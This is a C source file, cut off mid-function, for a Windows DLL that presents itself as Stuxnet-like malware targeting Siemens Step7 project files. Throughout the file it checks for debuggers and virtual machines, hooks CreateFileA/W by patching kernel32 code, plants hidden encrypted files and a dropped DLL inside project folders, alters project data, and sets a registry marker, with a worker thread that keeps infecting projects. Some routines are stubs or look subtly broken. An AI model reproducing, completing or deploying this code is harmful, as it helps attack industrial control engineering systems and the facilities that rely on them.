#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shlwapi.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define S7P_MAGIC                       0x53375000
#define S7P_VERSION                     0x00010400
#define S7P_MAX_PATH                    260
#define S7P_BUFFER_SIZE                 4096
#define S7P_DLL_NAME                    L"xyz.dll"

#define S7P_REG_KEY                     L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE"
#define S7P_REG_VALUE                   L"19790509"

#define S7P_DIR_APILOG                  L"ApiLog"
#define S7P_DIR_CONN                    L"CONN"
#define S7P_DIR_GLOBAL                  L"Global"
#define S7P_DIR_HOMSAVE7                L"hOmSave7"
#define S7P_DIR_XUTILS                  L"XUTILS"
#define S7P_DIR_XUTILS_LISTEN           L"XUTILS\\listen"
#define S7P_DIR_XUTILS_LINKS            L"XUTILS\\links"
#define S7P_FILE_XR000000               L"xr000000.mdx"
#define S7P_FILE_S7000001               L"s7000001.mdx"
#define S7P_FILE_S7P00001               L"s7p00001.dbf"

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)

typedef struct _S7P_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[S7P_MAX_PATH];
    WCHAR szSystemPath[S7P_MAX_PATH];
    WCHAR szWindowsPath[S7P_MAX_PATH];
    WCHAR szProjectPath[S7P_MAX_PATH];
    WCHAR szCurrentProject[S7P_MAX_PATH];
    WCHAR szDllName[64];
    BYTE bReserved[256];
} S7P_CTX, * PS7P_CTX;

typedef struct _S7P_INFECTION_RECORD {
    DWORD dwTimestamp;
    WCHAR szProjectPath[S7P_MAX_PATH];
    WCHAR szDllPath[S7P_MAX_PATH];
    DWORD dwStatus;
    BYTE bReserved[32];
} S7P_INFECTION_RECORD, * PS7P_INFECTION_RECORD;

static S7P_CTX g_S7pCtx;
static BOOL g_bInitialized = FALSE;
static DWORD g_dwInfectionCount = 0;
static DWORD g_dwProjectCount = 0;
static S7P_INFECTION_RECORD g_InfectionRecords[256];
static DWORD g_dwRecordCount = 0;

static BYTE g_EncryptionKey[32] = {
    0x3C, 0x1B, 0x0D, 0xFA, 0x6E, 0xC1, 0x5C, 0x27,
    0x0A, 0x3D, 0x52, 0xF9, 0xB4, 0x2F, 0xFB, 0xF6,
    0x61, 0x0E, 0x4A, 0x1F, 0x92, 0x2D, 0xF8, 0x33,
    0x5F, 0xFC, 0x49, 0xF6, 0x1E, 0x75, 0x0B, 0xB0
};

static const WCHAR g_wszSearchFolders[5][S7P_MAX_PATH] = {
    L"%ProgramFiles%\\Siemens\\Step7\\S7BIN",
    L"%SystemRoot%\\system32",
    L"%SystemRoot%\\system",
    L"%SystemRoot%",
    L""
};

static BOOL S7P_InitNtImports(VOID);
static BOOL S7P_Init(VOID);
static VOID S7P_Cleanup(VOID);
static BOOL S7P_CheckMutex(VOID);
static BOOL S7P_IsExpired(VOID);
static BOOL S7P_CheckDebugger(VOID);
static BOOL S7P_CheckVMware(VOID);
static DWORD S7P_ComputeCRC32(PBYTE pData, DWORD dwSize);
static VOID S7P_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize);
static VOID S7P_RC4Init(PBYTE pKey, DWORD dwKeySize, PBYTE pSBox);
static VOID S7P_RC4Crypt(PBYTE pData, DWORD dwSize, PBYTE pSBox, PDWORD pdwI, PDWORD pdwJ);
static VOID S7P_SimpleDecrypt(PBYTE pData, DWORD dwSize);
static VOID S7P_SimpleEncrypt(PBYTE pData, DWORD dwSize);
static BOOL S7P_EncryptData(PBYTE pPlain, DWORD dwPlainSize, PBYTE pCipher, PDWORD pdwCipherSize);
static BOOL S7P_DecryptData(PBYTE pCipher, DWORD dwCipherSize, PBYTE pPlain, PDWORD pdwPlainSize);
static BOOL S7P_IsStep7Project(LPCWSTR szPath);
static BOOL S7P_FindStep7Projects(LPCWSTR szRoot, PDWORD pdwCount);
static BOOL S7P_CreateDirectoryStructure(LPCWSTR szProjectPath);
static BOOL S7P_WriteEncryptedDLL(LPCWSTR szPath, PBYTE pData, DWORD dwSize);
static BOOL S7P_WriteConfigData(LPCWSTR szPath);
static BOOL S7P_WriteDataFile(LPCWSTR szPath);
static BOOL S7P_DropMaliciousDLL(LPCWSTR szProjectPath);
static BOOL S7P_ModifyDataFile(LPCWSTR szProjectPath);
static BOOL S7P_InjectProject(LPCWSTR szProjectPath);
static BOOL S7P_WriteRegistry(VOID);
static BOOL S7P_ReadRegistry(VOID);
static DWORD WINAPI S7P_WorkerThread(LPVOID lpParam);
static BOOL S7P_StartWorker(VOID);
static BOOL S7P_StopWorker(VOID);
static BOOL S7P_SelfDestruct(VOID);
static BOOL S7P_Execute(VOID);
static BOOL S7P_CreateFileAHook(VOID);
static BOOL S7P_CreateFileWHook(VOID);
static BOOL S7P_InstallHooks(VOID);
static VOID S7P_UninstallHooks(VOID);

typedef HANDLE (WINAPI *PFN_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef HANDLE (WINAPI *PFN_CreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);

static PFN_CreateFileA g_pOriginalCreateFileA = NULL;
static PFN_CreateFileW g_pOriginalCreateFileW = NULL;
static BOOL g_bHooksInstalled = FALSE;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
DWORD WINAPI Export1(VOID);
DWORD WINAPI Export2(VOID);
DWORD WINAPI Export3(VOID);
DWORD WINAPI Export4(VOID);
DWORD WINAPI Export5(VOID);
DWORD WINAPI Export6(VOID);
DWORD WINAPI Export7(VOID);
DWORD WINAPI Export8(VOID);
DWORD WINAPI Export9(VOID);
DWORD WINAPI Export10(VOID);
DWORD WINAPI Export11(VOID);
DWORD WINAPI Export12(VOID);
DWORD WINAPI Export13(VOID);
DWORD WINAPI Export14(VOID);
DWORD WINAPI Export15(VOID);
DWORD WINAPI Export16(VOID);
DWORD WINAPI Export17(VOID);
DWORD WINAPI Export18(VOID);
DWORD WINAPI Export19(VOID);
DWORD WINAPI Export20(VOID);

static BOOL S7P_InitNtImports(VOID) {
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) return FALSE;
    return TRUE;
}

static BOOL S7P_Init(VOID) {
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_S7pCtx, sizeof(S7P_CTX));
    g_S7pCtx.dwMagic = S7P_MAGIC;
    g_S7pCtx.dwVersion = S7P_VERSION;
    g_S7pCtx.dwPid = GetCurrentProcessId();
    g_S7pCtx.dwTid = GetCurrentThreadId();
    g_S7pCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_S7pCtx.csLock);
    GetModuleFileNameW(NULL, g_S7pCtx.szModulePath, S7P_MAX_PATH);
    GetSystemDirectoryW(g_S7pCtx.szSystemPath, S7P_MAX_PATH);
    GetWindowsDirectoryW(g_S7pCtx.szWindowsPath, S7P_MAX_PATH);
    wcscpy_s(g_S7pCtx.szProjectPath, S7P_MAX_PATH, L"C:\\");
    wcscpy_s(g_S7pCtx.szDllName, 64, S7P_DLL_NAME);
    S7P_InitNtImports();
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID S7P_Cleanup(VOID) {
    if (!g_bInitialized) return;
    S7P_UninstallHooks();
    if (g_S7pCtx.hMutex) {
        CloseHandle(g_S7pCtx.hMutex);
        g_S7pCtx.hMutex = NULL;
    }
    if (g_S7pCtx.hThread) {
        CloseHandle(g_S7pCtx.hThread);
        g_S7pCtx.hThread = NULL;
    }
    if (g_S7pCtx.hStopEvent) {
        CloseHandle(g_S7pCtx.hStopEvent);
        g_S7pCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_S7pCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL S7P_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_S7pCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL S7P_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL S7P_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL S7P_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static DWORD S7P_ComputeCRC32(PBYTE pData, DWORD dwSize) {
    DWORD crc = 0xFFFFFFFF;
    DWORD i, j;
    if (!pData || dwSize == 0) return 0xFFFFFFFF;
    for (i = 0; i < dwSize; i++) {
        crc ^= pData[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    return ~crc;
}

static VOID S7P_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize) {
    DWORD i;
    if (!pData || dwSize == 0 || !pKey || dwKeySize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= pKey[i % dwKeySize];
    }
}

static VOID S7P_RC4Init(PBYTE pKey, DWORD dwKeySize, PBYTE pSBox) {
    DWORD i, j;
    BYTE temp;
    if (!pKey || dwKeySize == 0 || !pSBox) return;
    for (i = 0; i < 256; i++) {
        pSBox[i] = (BYTE)i;
    }
    j = 0;
    for (i = 0; i < 256; i++) {
        j = (j + pSBox[i] + pKey[i % dwKeySize]) & 0xFF;
        temp = pSBox[i];
        pSBox[i] = pSBox[j];
        pSBox[j] = temp;
    }
}

static VOID S7P_RC4Crypt(PBYTE pData, DWORD dwSize, PBYTE pSBox, PDWORD pdwI, PDWORD pdwJ) {
    DWORD i;
    BYTE temp;
    if (!pData || dwSize == 0 || !pSBox || !pdwI || !pdwJ) return;
    for (i = 0; i < dwSize; i++) {
        *pdwI = (*pdwI + 1) & 0xFF;
        *pdwJ = (*pdwJ + pSBox[*pdwI]) & 0xFF;
        temp = pSBox[*pdwI];
        pSBox[*pdwI] = pSBox[*pdwJ];
        pSBox[*pdwJ] = temp;
        pData[i] ^= pSBox[(pSBox[*pdwI] + pSBox[*pdwJ]) & 0xFF];
    }
}

static VOID S7P_SimpleDecrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static VOID S7P_SimpleEncrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static BOOL S7P_EncryptData(PBYTE pPlain, DWORD dwPlainSize, PBYTE pCipher, PDWORD pdwCipherSize) {
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwKey = 0x01AE0000;
    if (!pPlain || dwPlainSize == 0 || !pCipher || !pdwCipherSize) return FALSE;
    if (*pdwCipherSize < dwPlainSize + 32) return FALSE;
    memcpy(pCipher, pPlain, dwPlainSize);
    for (DWORD round = 0; round < 3; round++) {
        S7P_SimpleEncrypt(pCipher, dwPlainSize);
        S7P_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        S7P_RC4Crypt(pCipher, dwPlainSize, SBox, &i, &j);
        S7P_XORDecrypt(pCipher, dwPlainSize, (PBYTE)&dwKey, sizeof(DWORD));
    }
    *pdwCipherSize = dwPlainSize;
    return TRUE;
}

static BOOL S7P_DecryptData(PBYTE pCipher, DWORD dwCipherSize, PBYTE pPlain, PDWORD pdwPlainSize) {
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwKey = 0x01AE0000;
    if (!pCipher || dwCipherSize == 0 || !pPlain || !pdwPlainSize) return FALSE;
    if (*pdwPlainSize < dwCipherSize) return FALSE;
    memcpy(pPlain, pCipher, dwCipherSize);
    for (DWORD round = 0; round < 3; round++) {
        S7P_XORDecrypt(pPlain, dwCipherSize, (PBYTE)&dwKey, sizeof(DWORD));
        S7P_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        S7P_RC4Crypt(pPlain, dwCipherSize, SBox, &i, &j);
        S7P_SimpleDecrypt(pPlain, dwCipherSize);
    }
    *pdwPlainSize = dwCipherSize;
    return TRUE;
}

static BOOL S7P_IsStep7Project(LPCWSTR szPath) {
    DWORD dwLen;
    if (!szPath) return FALSE;
    dwLen = (DWORD)wcslen(szPath);
    if (dwLen < 4) return FALSE;
    if (szPath[dwLen - 4] == L'.' &&
        (szPath[dwLen - 3] == L's' || szPath[dwLen - 3] == L'S') &&
        (szPath[dwLen - 2] == L'7') &&
        (szPath[dwLen - 1] == L'p' || szPath[dwLen - 1] == L'P')) {
        return TRUE;
    }
    return FALSE;
}

static BOOL S7P_FindStep7Projects(LPCWSTR szRoot, PDWORD pdwCount) {
    WCHAR szSearch[S7P_MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    if (!szRoot || !pdwCount) return FALSE;
    wsprintfW(szSearch, L"%s\\*.s7p", szRoot);
    hFind = FindFirstFileW(szSearch, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        wsprintfW(szSearch, L"%s\\*.S7P", szRoot);
        hFind = FindFirstFileW(szSearch, &fd);
        if (hFind == INVALID_HANDLE_VALUE) return FALSE;
    }
    *pdwCount = 0;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            if (*pdwCount < 1024) {
                wcscpy_s(g_S7pCtx.szCurrentProject, S7P_MAX_PATH, fd.cFileName);
                (*pdwCount)++;
                g_dwProjectCount++;
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    return (*pdwCount > 0);
}

static BOOL S7P_CreateDirectoryStructure(LPCWSTR szProjectPath) {
    WCHAR szPath[S7P_MAX_PATH];
    if (!szProjectPath) return FALSE;
    wsprintfW(szPath, L"%s\\%s", szProjectPath, S7P_DIR_XUTILS);
    CreateDirectoryW(szPath, NULL);
    SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN);
    wsprintfW(szPath, L"%s\\%s\\%s", szProjectPath, S7P_DIR_XUTILS, L"listen");
    CreateDirectoryW(szPath, NULL);
    SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN);
    wsprintfW(szPath, L"%s\\%s\\%s", szProjectPath, S7P_DIR_XUTILS, L"links");
    CreateDirectoryW(szPath, NULL);
    SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN);
    return TRUE;
}

static BOOL S7P_WriteEncryptedDLL(LPCWSTR szPath, PBYTE pData, DWORD dwSize) {
    HANDLE hFile;
    DWORD dwWritten;
    PBYTE pEncrypted;
    DWORD dwEncryptedSize;
    if (!szPath || !pData || dwSize == 0) return FALSE;
    dwEncryptedSize = dwSize + 32;
    pEncrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEncryptedSize);
    if (!pEncrypted) return FALSE;
    if (!S7P_EncryptData(pData, dwSize, pEncrypted, &dwEncryptedSize)) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return FALSE;
    }
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return FALSE;
    }
    WriteFile(hFile, pEncrypted, dwEncryptedSize, &dwWritten, NULL);
    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    return TRUE;
}

static BOOL S7P_WriteConfigData(LPCWSTR szPath) {
    HANDLE hFile;
    DWORD dwWritten;
    BYTE configData[256];
    if (!szPath) return FALSE;
    ZeroMemory(configData, sizeof(configData));
    *(DWORD*)(configData + 0) = STUXNET_MAGIC;
    *(DWORD*)(configData + 4) = STUXNET_VERSION;
    *(DWORD*)(configData + 8) = GetTickCount();
    *(DWORD*)(configData + 12) = 0x00000001;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, configData, sizeof(configData), &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL S7P_WriteDataFile(LPCWSTR szPath) {
    HANDLE hFile;
    DWORD dwWritten;
    BYTE data[90];
    if (!szPath) return FALSE;
    ZeroMemory(data, sizeof(data));
    *(DWORD*)(data + 0) = STUXNET_MAGIC;
    *(DWORD*)(data + 4) = 0x0000005A;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, data, sizeof(data), &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL S7P_DropMaliciousDLL(LPCWSTR szProjectPath) {
    WCHAR szSearch[S7P_MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    WCHAR szDllPath[S7P_MAX_PATH];
    WCHAR szSubFolder[S7P_MAX_PATH];
    if (!szProjectPath) return FALSE;
    wsprintfW(szSearch, L"%s\\%s\\*", szProjectPath, S7P_DIR_HOMSAVE7);
    hFind = FindFirstFileW(szSearch, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return FALSE;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (wcscmp(fd.cFileName, L".") != 0 && wcscmp(fd.cFileName, L"..") != 0) {
                wsprintfW(szSubFolder, L"%s\\%s\\%s", szProjectPath, S7P_DIR_HOMSAVE7, fd.cFileName);
                wsprintfW(szDllPath, L"%s\\%s", szSubFolder, g_S7pCtx.szDllName);
                HANDLE hDll = CreateFileW(szDllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
                if (hDll != INVALID_HANDLE_VALUE) {
                    BYTE dllStub[1024];
                    ZeroMemory(dllStub, sizeof(dllStub));
                    DWORD dwWritten;
                    WriteFile(hDll, dllStub, sizeof(dllStub), &dwWritten, NULL);
                    CloseHandle(hDll);
                }
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    return TRUE;
}

static BOOL S7P_ModifyDataFile(LPCWSTR szProjectPath) {
    WCHAR szSearch[S7P_MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    WCHAR szFilePath[S7P_MAX_PATH];
    if (!szProjectPath) return FALSE;
    wsprintfW(szSearch, L"%s\\%s\\*", szProjectPath, S7P_DIR_HOMSAVE7);
    hFind = FindFirstFileW(szSearch, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return FALSE;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            wsprintfW(szFilePath, L"%s\\%s\\%s", szProjectPath, S7P_DIR_HOMSAVE7, fd.cFileName);
            HANDLE hFile = CreateFileW(szFilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD dwSize = GetFileSize(hFile, NULL);
                if (dwSize > 0) {
                    BYTE* pData = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
                    if (pData) {
                        DWORD dwRead;
                        ReadFile(hFile, pData, dwSize, &dwRead, NULL);
                        if (dwRead > 0) {
                            for (DWORD i = 0; i < dwRead - 4; i++) {
                                if (*(DWORD*)(pData + i) == 0x00000001) {
                                    *(DWORD*)(pData + i) = 0x53545558;
                                    break;
                                }
                            }
                            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
                            DWORD dwWritten;
                            WriteFile(hFile, pData, dwRead, &dwWritten, NULL);
                        }
                        HeapFree(GetProcessHeap(), 0, pData);
                    }
                }
                CloseHandle(hFile);
                break;
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    return TRUE;
}

static BOOL S7P_InjectProject(LPCWSTR szProjectPath) {
    WCHAR szPath[S7P_MAX_PATH];
    BYTE dllData[4096];
    DWORD dwDllSize;
    if (!szProjectPath) return FALSE;
    if (!S7P_CreateDirectoryStructure(szProjectPath)) return FALSE;
    wsprintfW(szPath, L"%s\\%s\\%s", szProjectPath, S7P_DIR_XUTILS_LISTEN, S7P_FILE_XR000000);
    dwDllSize = sizeof(dllData);
    ZeroMemory(dllData, dwDllSize);
    *(DWORD*)(dllData + 0) = STUXNET_MAGIC;
    *(DWORD*)(dllData + 4) = STUXNET_VERSION;
    if (!S7P_WriteEncryptedDLL(szPath, dllData, dwDllSize)) return FALSE;
    wsprintfW(szPath, L"%s\\%s\\%s", szProjectPath, S7P_DIR_XUTILS_LISTEN, S7P_FILE_S7000001);
    if (!S7P_WriteConfigData(szPath)) return FALSE;
    wsprintfW(szPath, L"%s\\%s\\%s", szProjectPath, S7P_DIR_XUTILS_LINKS, S7P_FILE_S7P00001);
    if (!S7P_WriteDataFile(szPath)) return FALSE;
    if (!S7P_DropMaliciousDLL(szProjectPath)) return FALSE;
    if (!S7P_ModifyDataFile(szProjectPath)) return FALSE;
    EnterCriticalSection(&g_S7pCtx.csLock);
    if (g_dwRecordCount < 256) {
        g_InfectionRecords[g_dwRecordCount].dwTimestamp = GetTickCount();
        wcscpy_s(g_InfectionRecords[g_dwRecordCount].szProjectPath, S7P_MAX_PATH, szProjectPath);
        wcscpy_s(g_InfectionRecords[g_dwRecordCount].szDllPath, S7P_MAX_PATH, g_S7pCtx.szDllName);
        g_InfectionRecords[g_dwRecordCount].dwStatus = 1;
        g_dwRecordCount++;
    }
    LeaveCriticalSection(&g_S7pCtx.csLock);
    g_dwInfectionCount++;
    return TRUE;
}

static HANDLE WINAPI S7P_CreateFileA_Hook(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
    HANDLE hResult;
    WCHAR wszFileName[S7P_MAX_PATH];
    if (!g_pOriginalCreateFileA) return INVALID_HANDLE_VALUE;
    if (lpFileName) {
        MultiByteToWideChar(CP_ACP, 0, lpFileName, -1, wszFileName, S7P_MAX_PATH);
        if (S7P_IsStep7Project(wszFileName)) {
            WCHAR szDir[S7P_MAX_PATH];
            wcscpy_s(szDir, S7P_MAX_PATH, wszFileName);
            WCHAR* pLastSlash = wcsrchr(szDir, L'\\');
            if (pLastSlash) {
                *pLastSlash = L'\0';
                S7P_InjectProject(szDir);
            }
        }
    }
    hResult = g_pOriginalCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
    return hResult;
}

static HANDLE WINAPI S7P_CreateFileW_Hook(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
    HANDLE hResult;
    if (!g_pOriginalCreateFileW) return INVALID_HANDLE_VALUE;
    if (lpFileName && S7P_IsStep7Project(lpFileName)) {
        WCHAR szDir[S7P_MAX_PATH];
        wcscpy_s(szDir, S7P_MAX_PATH, lpFileName);
        WCHAR* pLastSlash = wcsrchr(szDir, L'\\');
        if (pLastSlash) {
            *pLastSlash = L'\0';
            S7P_InjectProject(szDir);
        }
    }
    hResult = g_pOriginalCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
    return hResult;
}

static BOOL S7P_InstallHooks(VOID) {
    HMODULE hKernel32;
    BYTE* pFunc;
    DWORD dwOldProtect;
    if (g_bHooksInstalled) return TRUE;
    hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) return FALSE;
    g_pOriginalCreateFileA = (PFN_CreateFileA)GetProcAddress(hKernel32, "CreateFileA");
    g_pOriginalCreateFileW = (PFN_CreateFileW)GetProcAddress(hKernel32, "CreateFileW");
    if (!g_pOriginalCreateFileA || !g_pOriginalCreateFileW) return FALSE;
    pFunc = (BYTE*)g_pOriginalCreateFileA;
    VirtualProtect(pFunc, 8, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    pFunc[0] = 0xE9;
    *(DWORD*)(pFunc + 1) = (DWORD)((BYTE*)S7P_CreateFileA_Hook - pFunc - 5);
    VirtualProtect(pFunc, 8, dwOldProtect, &dwOldProtect);
    pFunc = (BYTE*)g_pOriginalCreateFileW;
    VirtualProtect(pFunc, 8, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    pFunc[0] = 0xE9;
    *(DWORD*)(pFunc + 1) = (DWORD)((BYTE*)S7P_CreateFileW_Hook - pFunc - 5);
    VirtualProtect(pFunc, 8, dwOldProtect, &dwOldProtect);
    g_bHooksInstalled = TRUE;
    return TRUE;
}

static VOID S7P_UninstallHooks(VOID) {
    BYTE* pFunc;
    DWORD dwOldProtect;
    if (!g_bHooksInstalled) return;
    if (g_pOriginalCreateFileA) {
        pFunc = (BYTE*)g_pOriginalCreateFileA;
        VirtualProtect(pFunc, 8, PAGE_EXECUTE_READWRITE, &dwOldProtect);
        pFunc[0] = 0xE9;
        *(DWORD*)(pFunc + 1) = 0x00000000;
        VirtualProtect(pFunc, 8, dwOldProtect, &dwOldProtect);
    }
    if (g_pOriginalCreateFileW) {
        pFunc = (BYTE*)g_pOriginalCreateFileW;
        VirtualProtect(pFunc, 8, PAGE_EXECUTE_READWRITE, &dwOldProtect);
        pFunc[0] = 0xE9;
        *(DWORD*)(pFunc + 1) = 0x00000000;
        VirtualProtect(pFunc, 8, dwOldProtect, &dwOldProtect);
    }
    g_bHooksInstalled = FALSE;
}

static BOOL S7P_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, S7P_REG_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, S7P_REG_VALUE, 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL S7P_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, S7P_REG_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, S7P_REG_VALUE, NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static DWORD WINAPI S7P_WorkerThread(LPVOID lpParam) {
    WCHAR szSearch[S7P_MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    DWORD dwTick;
    dwTick = GetTickCount();
    while (WaitForSingleObject(g_S7pCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (S7P_IsExpired()) {
            break;
        }
        if (!S7P_ReadRegistry()) {
            S7P_WriteRegistry();
        }
        GetWindowsDirectoryW(szSearch, S7P_MAX_PATH);
        wcscat_s(szSearch, S7P_MAX_PATH, L"\\*.s7p");
        hFind = FindFirstFileW(szSearch, &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    WCHAR szPath[S7P_MAX_PATH];
                    wsprintfW(szPath, L"%s\\%s", g_S7pCtx.szWindowsPath, fd.cFileName);
                    S7P_InjectProject(szPath);
                }
